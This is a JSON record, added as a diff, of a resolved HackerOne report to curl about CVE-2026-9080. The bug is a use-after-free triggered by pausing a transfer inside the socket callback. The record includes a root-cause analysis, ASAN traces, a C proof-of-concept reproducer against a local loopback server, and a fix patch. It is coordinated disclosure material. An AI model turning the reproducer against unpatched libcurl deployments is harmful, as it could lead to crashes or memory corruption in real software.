@@ -1,0 +1,113 @@
+{
+  "id": 3749204,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNzQ5MjA0",
+  "url": "https://hackerone.com/reports/3749204",
+  "title": "CVE-2026-9080: UAF after pause in socket callback",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "low",
+  "readable_substate": "Resolved",
+  "created_at": "2026-05-19T22:04:22.921Z",
+  "submitted_at": "2026-05-19T22:04:23.425Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "giant_anteater",
+    "url": "/giant_anteater",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/r9sgcvqgyzx7oyd4vqjv580xuk4y/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2026-9080"
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2026-06-24T08:25:17.925Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2026-06-24T06:16:26.047Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi all,\n\nWe've found a heap-use-after-free in `lib/multi_ev.c` triggered by calling\n`curl_easy_pause()` from within a `CURLMOPT_SOCKETFUNCTION` callback.\nASAN-confirmed with the self-contained reproducer below.\n\n**Affected versions:** 8.13.0 – 8.20.0 (current).  \nThe `entry->action` write (line 280) has been vulnerable since the `multi_ev`\nrewrite in 8.13.0 (commit `cfc657a48d`, 2025-04-02). The `entry->announced`\nbit-field write (line 275) was added in 8.16.0 (commit `3d302250ec`,\n2025-09-10) and is what ASAN catches first, because a bit-field write compiles\nto a read-modify-write.\n\n---\n\n## Root cause\n\n`mev_sh_entry_update()` fires the socket callback, then writes to the\n`mev_sh_entry` it was passed:\n\n```c\n/* lib/multi_ev.c */\nmev_in_callback(multi, TRUE);\nrc = multi->socket_cb(data, s, comboaction,\n                      multi->socket_userp, entry->user_data);  /* fires app callback */\nmev_in_callback(multi, FALSE);\nentry->announced = TRUE;           /* UAF WRITE — entry may be freed  (line 275) */\nif(rc == -1) { ... }\nentry->action = (unsigned int)comboaction;                     /* UAF WRITE (line 280) */\n```\n\n`curl_easy_pause()` is [documented](https://curl.se/libcurl/c/curl_easy_pause.html)\nas legal to call from any callback:\n\n> \"Unlike most other libcurl functions, curl_easy_pause(3) can be used from\n> within callbacks.\"\n\n`CURLMOPT_SOCKETFUNCTION` documentation adds no restriction on this.\n\nWhen called from the socket callback, `curl_easy_pause()` invokes\n`Curl_multi_ev_assess_xfer()` (easy.c:1183), which calls `mev_assess()`.\n**`mev_assess()` has no guard on `multi->in_callback`** — the flag is set by\n`mev_in_callback()` but never checked inside `multi_ev.c`. If the pause\nempties the transfer's poll-set (recv paused, nothing left to send),\n`mev_pollset_diff()` calls `mev_forget_socket()` → `mev_sh_entry_kill()` →\n`free(entry)`. The writes at lines 275 and 280 then land on freed memory.\n\n---\n\n## ASAN output\n\n```\n=================================================================\n==59330==ERROR: AddressSanitizer: heap-use-after-free on address 0x60b00000342c at pc 0x000100c9bde4 bp 0x00016fb5d390 sp 0x00016fb5d388\nREAD of size 1 at 0x60b00000342c thread T0\n    #0 0x000100c9bde0 in mev_sh_entry_update multi_ev.c:275\n    #1 0x000100c99c14 in mev_pollset_diff multi_ev.c:360\n    #2 0x000100c97900 in mev_assess multi_ev.c:512\n    #3 0x000100c97634 in Curl_multi_ev_assess_xfer multi_ev.c:523\n    #4 0x000100c96930 in multi_run_dirty multi.c:3203\n    #5 0x000100c84e2c in multi_socket multi.c:3265\n    #6 0x000100c851e4 in curl_multi_socket_action multi.c:3445\n    #7 0x0001002a1758 in main poc_uaf.c:276\n\n0x60b00000342c is located 92 bytes inside of 104-byte region [0x60b0000033d0,0x60b000003438)\nfreed by thread T0 here:\n    #0 0x000101065424 in free+0x7c (libclang_rt.asan_osx_dynamic.dylib)\n    #1 0x000100c584c4 in curl_dbg_free memdebug.c:385\n    #2 0x000100c98ed4 in mev_sh_entry_dtor multi_ev.c:78\n    #3 0x000100bd3b98 in hash_elem_clear_ptr hash.c:129\n    #4 0x000100bd43d0 in hash_elem_destroy hash.c:137\n    #5 0x000100bd4278 in Curl_hash_delete hash.c:225\n    #6 0x000100c9c3d4 in mev_sh_entry_kill multi_ev.c:123\n    #7 0x000100c98b08 in mev_forget_socket multi_ev.c:207\n    #8 0x000100c9a7d4 in mev_pollset_diff multi_ev.c:420\n    #9 0x000100c97900 in mev_assess multi_ev.c:512\n   #10 0x000100c97634 in Curl_multi_ev_assess_xfer multi_ev.c:523\n   #11 0x000100b942dc in curl_easy_pause easy.c:1183\n   #12 0x0001002a2044 in sock_cb poc_uaf.c:181\n   #13 0x000100c9bd80 in mev_sh_entry_update multi_ev.c:272\n   #14 0x000100c99c14 in mev_pollset_diff multi_ev.c:360\n   #15 0x000100c97900 in mev_assess multi_ev.c:512\n   #16 0x000100c97634 in Curl_multi_ev_assess_xfer multi_ev.c:523\n   #17 0x000100c96930 in multi_run_dirty multi.c:3203\n   #18 0x000100c84e2c in multi_socket multi.c:3265\n   #19 0x000100c851e4 in curl_multi_socket_action multi.c:3445\n   #20 0x0001002a1758 in main poc_uaf.c:276\n\npreviously allocated by thread T0 here:\n    #0 0x000101065620 in calloc+0x80 (libclang_rt.asan_osx_dynamic.dylib)\n    #1 0x000100c57cec in curl_dbg_calloc memdebug.c:254\n    #2 0x000100c9aa20 in mev_sh_entry_add multi_ev.c:105\n    #3 0x000100c992a4 in mev_pollset_diff multi_ev.c:317\n    #4 0x000100c97900 in mev_assess multi_ev.c:512\n    #5 0x000100c97634 in Curl_multi_ev_assess_xfer multi_ev.c:523\n    #6 0x000100c96930 in multi_run_dirty multi.c:3203\n    #7 0x000100c84e2c in multi_socket multi.c:3265\n    #8 0x000100c851e4 in curl_multi_socket_action multi.c:3445\n    #9 0x0001002a1758 in main poc_uaf.c:276\n\nSUMMARY: AddressSanitizer: heap-use-after-free multi_ev.c:275 in mev_sh_entry_update\n```\n\n---\n\n## Reproducer\n\nSelf-contained; spins up its own HTTP server in a thread. Build against a\nlibcurl compiled with `-fsanitize=address`:\n\n```\ncc -g -fsanitize=address -fno-omit-frame-pointer poc_uaf.c \\\n    -Iinclude -Ibuild-asan/lib -Lbuild-asan/lib -lcurl-d \\\n    -Wl,-rpath,$(pwd)/build-asan/lib -o poc_uaf\nASAN_OPTIONS=halt_on_error=1:print_stacktrace=1 ./poc_uaf\n```\n\n```c\n/*\n * poc_uaf.c\n *\n * Trigger: call curl_easy_pause(easy, CURLPAUSE_RECV) from inside\n * CURLMOPT_SOCKETFUNCTION.  When the socket transitions from POLL_OUT to\n * POLL_IN (request sent, response pending), pausing recv empties the\n * transfer's poll-set, causing mev_forget_socket() to free the mev_sh_entry\n * that mev_sh_entry_update() is still about to write to.\n */\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n#include <errno.h>\n#include <pthread.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n#include <curl/curl.h>\n\nstatic int g_server_port;\n\nstatic void *server_thread(void *arg)\n{\n  int lfd = *(int *)arg;\n  char buf[4096];\n  for(;;) {\n    int cfd = accept(lfd, NULL, NULL);\n    if(cfd < 0)\n      break;\n    (void)recv(cfd, buf, sizeof(buf), 0);\n    const char *resp =\n      \"HTTP/1.1 200 OK\\r\\n\"\n      \"Content-Length: 512\\r\\n\"\n      \"Connection: close\\r\\n\"\n      \"\\r\\n\";\n    (void)send(cfd, resp, strlen(resp), 0);\n    memset(buf, 'X', 512);\n    (void)send(cfd, buf, 512, 0);\n    close(cfd);\n  }\n  return NULL;\n}\n\nstatic int start_server(void)\n{\n  static int lfd;\n  lfd = socket(AF_INET, SOCK_STREAM, 0);\n  int opt = 1;\n  setsockopt(lfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));\n  struct sockaddr_in a = {0};\n  a.sin_family      = AF_INET;\n  a.sin_addr.s_addr = htonl(INADDR_LOOPBACK);\n  a.sin_port        = 0;\n  bind(lfd, (struct sockaddr *)&a, sizeof(a));\n  listen(lfd, 8);\n  socklen_t len = sizeof(a);\n  getsockname(lfd, (struct sockaddr *)&a, &len);\n  g_server_port = ntohs(a.sin_port);\n  pthread_t t;\n  pthread_create(&t, NULL, server_thread, &lfd);\n  pthread_detach(t);\n  return lfd;\n}\n\n#define MAX_FDS 64\n\nstruct ctx {\n  CURLM         *multi;\n  int            still_running;\n  curl_socket_t  fds[MAX_FDS];\n  int            actions[MAX_FDS];\n  int            nfds;\n  int            pause_fired;\n  int            iterations;\n};\n\nstatic void fd_add(struct ctx *c, curl_socket_t s, int action)\n{\n  for(int i = 0; i < c->nfds; i++) {\n    if(c->fds[i] == s) { c->actions[i] = action; return; }\n  }\n  if(c->nfds < MAX_FDS) {\n    c->fds[c->nfds]     = s;\n    c->actions[c->nfds] = action;\n    c->nfds++;\n  }\n}\n\nstatic void fd_del(struct ctx *c, curl_socket_t s)\n{\n  for(int i = 0; i < c->nfds; i++) {\n    if(c->fds[i] == s) {\n      c->nfds--;\n      c->fds[i]     = c->fds[c->nfds];\n      c->actions[i] = c->actions[c->nfds];\n      return;\n    }\n  }\n}\n\nstatic int sock_cb(CURL *easy, curl_socket_t s, int what,\n                   void *userp, void *socketp)\n{\n  struct ctx *c = userp;\n  (void)socketp;\n  if(what == CURL_POLL_REMOVE) { fd_del(c, s); return 0; }\n  fd_add(c, s, what);\n\n  if(!c->pause_fired && (what & CURL_POLL_IN)) {\n    /*\n     * The first POLL_IN may be the multi handle's internal wakeup pipe\n     * (admin handle, conn==NULL); curl_easy_pause() returns\n     * CURLE_BAD_FUNCTION_ARGUMENT and the re-entrant path is not taken.\n     * Leave pause_fired=0 and retry on the next POLL_IN, which will be\n     * the actual transfer socket (conn!=NULL).\n     */\n    CURLcode rc = curl_easy_pause(easy, CURLPAUSE_RECV);\n    if(rc == CURLE_OK)\n      c->pause_fired = 1;\n  }\n  return 0;\n}\n\nstatic int timer_cb(CURLM *m, long ms, void *u) { (void)m;(void)ms;(void)u; return 0; }\nstatic size_t write_cb(char *p, size_t sz, size_t n, void *u) { (void)p;(void)u; return sz*n; }\n\nint main(void)\n{\n  start_server();\n  curl_global_init(CURL_GLOBAL_DEFAULT);\n\n  struct ctx c = {0};\n  c.multi = curl_multi_init();\n  curl_multi_setopt(c.multi, CURLMOPT_SOCKETFUNCTION, sock_cb);\n  curl_multi_setopt(c.multi, CURLMOPT_SOCKETDATA,     &c);\n  curl_multi_setopt(c.multi, CURLMOPT_TIMERFUNCTION,  timer_cb);\n  curl_multi_setopt(c.multi, CURLMOPT_TIMERDATA,      &c);\n\n  CURL *easy = curl_easy_init();\n  char url[64];\n  snprintf(url, sizeof(url), \"http://127.0.0.1:%d/test\", g_server_port);\n  curl_easy_setopt(easy, CURLOPT_URL,           url);\n  curl_easy_setopt(easy, CURLOPT_WRITEFUNCTION, write_cb);\n  curl_easy_setopt(easy, CURLOPT_VERBOSE,       0L);\n\n  curl_multi_add_handle(c.multi, easy);\n  curl_multi_socket_action(c.multi, CURL_SOCKET_TIMEOUT, 0, &c.still_running);\n\n  while(c.still_running && c.iterations < 2000) {\n    c.iterations++;\n    fd_set rfds, wfds;\n    FD_ZERO(&rfds); FD_ZERO(&wfds);\n    int maxfd = -1;\n    for(int i = 0; i < c.nfds; i++) {\n      curl_socket_t s = c.fds[i];\n      int           a = c.actions[i];\n      if(a & CURL_POLL_IN)  { FD_SET(s, &rfds); if((int)s > maxfd) maxfd = s; }\n      if(a & CURL_POLL_OUT) { FD_SET(s, &wfds); if((int)s > maxfd) maxfd = s; }\n    }\n    if(maxfd < 0) {\n      usleep(5000);\n      curl_multi_socket_action(c.multi, CURL_SOCKET_TIMEOUT, 0, &c.still_running);\n      continue;\n    }\n    struct timeval tv = { .tv_sec = 0, .tv_usec = 50000 };\n    int rc = select(maxfd + 1, &rfds, &wfds, NULL, &tv);\n    if(rc < 0) { if(errno == EINTR) continue; break; }\n    if(rc == 0) {\n      curl_multi_socket_action(c.multi, CURL_SOCKET_TIMEOUT, 0, &c.still_running);\n      continue;\n    }\n    curl_socket_t ready_s[MAX_FDS]; int ready_ev[MAX_FDS]; int nready = 0;\n    for(int i = 0; i < c.nfds && nready < MAX_FDS; i++) {\n      curl_socket_t s = c.fds[i];\n      int ev = 0;\n      if(FD_ISSET(s, &rfds)) ev |= CURL_CSELECT_IN;\n      if(FD_ISSET(s, &wfds)) ev |= CURL_CSELECT_OUT;\n      if(ev) { ready_s[nready] = s; ready_ev[nready] = ev; nready++; }\n    }\n    for(int i = 0; i < nready; i++)\n      curl_multi_socket_action(c.multi, ready_s[i], ready_ev[i], &c.still_running);\n  }\n\n  curl_multi_remove_handle(c.multi, easy);\n  curl_easy_cleanup(easy);\n  curl_multi_cleanup(c.multi);\n  curl_global_cleanup();\n  return 0;\n}\n```\n\n---\n\n## Fix\n\nRe-fetch the entry from the hash after the callback returns. The socket fd `s`\nis safe to use (it is a value on the stack); only the hash-owned `entry`\npointer may be stale. The `rc == -1` check is moved before the re-fetch so a\ncallback-abort is still reported even if the entry was freed.\n\n```diff\n--- a/lib/multi_ev.c\n+++ b/lib/multi_ev.c\n@@ -271,9 +271,14 @@ static CURLMcode mev_sh_entry_update(...)\n   mev_in_callback(multi, TRUE);\n   rc = multi->socket_cb(data, s, comboaction, multi->socket_userp,\n                         entry->user_data);\n   mev_in_callback(multi, FALSE);\n-  entry->announced = TRUE;\n   if(rc == -1) {\n     multi->dead = TRUE;\n     return CURLM_ABORTED_BY_CALLBACK;\n   }\n+  /* curl_easy_pause() is documented as callable from any callback; it\n+   * re-enters mev_assess() which may free this entry. Re-fetch. */\n+  entry = mev_sh_entry_get(&multi->ev.sh_entries, s);\n+  if(!entry)\n+    return CURLM_OK;\n+  entry->announced = TRUE;\n   entry->action = (unsigned int)comboaction;\n   return CURLM_OK;\n```\n\nRegards,\nAISLE Research Team\n\n## Impact\n\nUse-after-free",
+  "weakness": {
+    "id": 50,
+    "name": "Use After Free"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 0,
+  "voters": [],
+  "severity": {
+    "rating": "low",
+    "author_type": "Team"
+  },
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
